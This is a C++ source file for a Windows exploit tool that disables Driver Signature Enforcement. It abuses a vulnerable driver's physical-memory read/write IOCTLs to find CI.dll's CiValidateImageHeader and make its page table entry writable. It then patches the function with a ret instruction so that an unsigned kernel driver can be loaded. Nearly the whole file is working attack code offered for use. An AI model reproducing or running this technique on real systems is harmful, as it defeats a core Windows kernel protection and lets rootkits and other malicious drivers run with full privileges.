#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <map>
#include <winternl.h>
#include <ntstatus.h>
#include "driver_handler.h"
#include <stdio.h>

// Function pointer declaration for NtQuerySystemInformation
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
    );

// Declare PRTL_PROCESS_MODULES structure
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

#define SystemModuleInformation 11

typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_LEN 16

char patch[] = { 0xC3 };  // Patch with "ret" instruction (disabling DSE)
u64 driver_handle = -1;
char winio_path[FILENAME_MAX];

struct winio_packet {
    u64 size;
    u64 phys_address;
    u64 phys_handle;
    u64 phys_linear;
    u64 phys_section;
};

// Function to get kernel module address
ULONG_PTR GetKernelModuleAddress(const char* name) {
    ULONG size = 0;
    PRTL_PROCESS_MODULES modules;
    void* buffer = NULL;

    pNtQuerySystemInformation NtQuerySystemInformation =
        (pNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, size, &size);

    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, size, &size);
    }

    if (!NT_SUCCESS(status)) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return NULL;
    }

    modules = (PRTL_PROCESS_MODULES)buffer;

    for (int i = 0; i < modules->NumberOfModules; i++) {
        char* currentName = (char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
        if (!_stricmp(currentName, name)) {
            ULONG_PTR result = (ULONG_PTR)modules->Modules[i].ImageBase;
            VirtualFree(buffer, 0, MEM_RELEASE);
            return result;
        }
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    return NULL;
}

// Signature Search in memory
void* signatureSearch(char* base, char* inSig, int length, int maxHuntLength) {
    for (int i = 0; i < maxHuntLength; i++) {
        if (base[i] == inSig[0]) {
            if (memcmp(base + i, inSig, length) == 0) {
                return base + i;
            }
        }
    }
    return NULL;
}

// Memory map function
void* mapFileIntoMemory(const char* path) {
    HANDLE fileHandle = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (fileMapping == NULL) {
        CloseHandle(fileHandle);
        return NULL;
    }

    void* fileMap = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(fileMapping);
    CloseHandle(fileHandle);
    return fileMap;
}

// Find pattern in kernel section
ULONG_PTR signatureSearchInSection(const char* section, char* base, char* inSig, int length) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)((char*)base + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((char*)ntHeaders + sizeof(IMAGE_NT_HEADERS64));

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(sectionHeaders[i].Name, section, strlen(section)) == 0) {
            char* sectionBase = base + sectionHeaders[i].VirtualAddress;
            return (ULONG_PTR)signatureSearch(sectionBase, inSig, length, sectionHeaders[i].SizeOfRawData);
        }
    }

    return NULL;
}

// Map memory using vulnerable driver
u64 phys_map(winio_packet& packet) {
    u32 bytes_returned;
    if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, &packet, sizeof(winio_packet), &packet, sizeof(winio_packet), &bytes_returned, NULL))
        return NULL;
    return packet.phys_linear;
}

bool read_phys(u64 addr, u64 buf, u64 size) {
    winio_packet packet;
    packet.phys_address = addr;
    packet.size = size;

    u64 linear_address = phys_map(packet);
    if (linear_address == NULL)
        return false;

    memcpy((void*)buf, (void*)linear_address, size);
    return true;
}

// Write physical memory using vulnerable driver
bool write_phys(u64 addr, u64 buf, u64 size) {
    winio_packet packet;
    packet.phys_address = addr;
    packet.size = size;

    u64 linear_address = phys_map(packet);
    if (linear_address == NULL)
        return false;

    memcpy((void*)linear_address, (void*)buf, size);
    return true;
}

// Get the PTE base address for kernel memory write
ULONG_PTR getPTEForVA(ULONG_PTR pteBase, ULONG_PTR address) {
    address = address >> 9;
    address &= 0x7FFFFFFFF8;
    address += (ULONG_PTR)pteBase;
    return address;
}

// Read and modify the PTE for writable kernel memory
void modifyPTEToWrite(u64 pteBase, u64 address) {
    ULONG_PTR pteAddress = getPTEForVA(pteBase, address);
    u64 pteValue = 0;

    // Read PTE value and set the write bit
    read_phys(pteAddress, (u64)&pteValue, sizeof(pteValue));
    printf("[*] Original PTE value at 0x%llx: 0x%llx\n", pteAddress, pteValue);

    pteValue |= 2; // Set the write bit
    write_phys(pteAddress, (u64)&pteValue, sizeof(pteValue));
    printf("[*] Modified PTE value at 0x%llx: 0x%llx\n", pteAddress, pteValue);
}

int main(int argc, char* argv[]) {
    printf("[*] DSE Bypass using Vulnerable Driver\n");

    // Ensure correct number of arguments
    if (argc < 3) {
        printf("[!] Usage: dse_hook.exe <driver_name> <path_to_driver.sys>\n");
        return -1;
    }

    const char* driver_name = argv[1];
    const char* driver_path = argv[2];

    // Get the base address of ntoskrnl.exe and CI.dll
    ULONG_PTR kernelBase = GetKernelModuleAddress("ntoskrnl.exe");
    ULONG_PTR ciBase = GetKernelModuleAddress("CI.dll");

    if (!kernelBase || !ciBase) {
        printf("[!] Failed to get ntoskrnl or CI.dll base addresses\n");
        return -1;
    }
    printf("[*] Kernel Base: 0x%llx\n", kernelBase);
    printf("[*] CI.dll Base: 0x%llx\n", ciBase);

    // Load kernel image into memory
    void* kernelImage = mapFileIntoMemory("C:\\Windows\\System32\\ntoskrnl.exe");
    void* ciImage = mapFileIntoMemory("C:\\Windows\\System32\\ci.dll");

    if (!kernelImage || !ciImage) {
        printf("[!] Failed to map kernel or ci.dll into memory\n");
        return -1;
    }

    // Signature search for CiValidateImageHeader
    const char CiValidateImageHeaderSig[] = {
       0x48, 0x89, 0x5C, 0x24, 0x20,  // mov qword ptr [rsp+20h],rbx
       0x55,                          // push rbp
       0x56,                          // push rsi
       0x57                           // push rdi
    };
    const int ciValidateImageHeaderSigOffset = 0x23;

    ULONG_PTR ciValidateImageHeader = (ULONG_PTR)signatureSearchInSection(".text", (char*)ciImage, (char*)CiValidateImageHeaderSig, sizeof(CiValidateImageHeaderSig));
    if (!ciValidateImageHeader) {
        printf("[!] Failed to find CiValidateImageHeader signature\n");
        return -1;
    }

    ciValidateImageHeader = ciValidateImageHeader - (ULONG_PTR)ciImage + ciBase - ciValidateImageHeaderSigOffset;
    printf("[*] CiValidateImageHeader: 0x%llx\n", ciValidateImageHeader);

    // PTE base address calculation
    const char miGetPteAddressSig[] = { 0x48, 0xC1, 0xE9, 0x09, 0x48, 0xB8 };
    ULONG_PTR miGetPteAddress = (ULONG_PTR)signatureSearchInSection(".text", (char*)kernelImage, (char*)miGetPteAddressSig, sizeof(miGetPteAddressSig));

    if (!miGetPteAddress) {
        printf("[!] Failed to find MiGetPteAddress signature\n");
        return -1;
    }

    miGetPteAddress = miGetPteAddress - (ULONG_PTR)kernelImage + kernelBase;
    printf("[*] MiGetPteAddress: 0x%llx\n", miGetPteAddress);

    // Read the base PTE address from kernel
    u64 pteBase = 0;
    read_phys(miGetPteAddress, (u64)&pteBase, sizeof(pteBase));
    printf("[*] PTE Base: 0x%llx\n", pteBase);

    // Modify the PTE to allow writes
    modifyPTEToWrite(pteBase, ciValidateImageHeader);

    // Write shellcode to disable DSE
    const char patch[] = { 0xC3 }; // ret instruction
    write_phys(ciValidateImageHeader, (u64)&patch, sizeof(patch));
    printf("[*] Successfully patched CiValidateImageHeader at 0x%llx with ret instruction (0xC3)\n", ciValidateImageHeader);

    // Load the unsigned driver
    printf("[*] Attempting to load the unsigned driver...\n");
    load_driver_lazy(driver_name, driver_path);

    // Open driver handle and test communication
    HANDLE driver_handle = open_driver_handle(driver_name);
    if (!driver_handle) {
        printf("[!] Failed to open driver handle. Exiting...\n");
        return -1;
    }

    // Test communication with the loaded driver
    if (send_ioctl_hello(driver_handle)) {
        printf("[*] Successfully communicated with the unsigned driver!\n");
    }
    else {
        printf("[!] Failed to communicate with the unsigned driver.\n");
    }

    // Close the driver handle
    close_driver_handle(driver_handle);

    // Ask the user if they want to unload the driver
    char user_input;
    printf("Do you want to unload the driver? (y/n): ");
    scanf(" %c", &user_input);

    if (user_input == 'y' || user_input == 'Y') {
        unload_driver_lazy(driver_name);
        printf("[*] Driver unloaded successfully.\n");
    }
    else {
        printf("[*] Keeping the driver loaded.\n");
    }

    return 0;
}
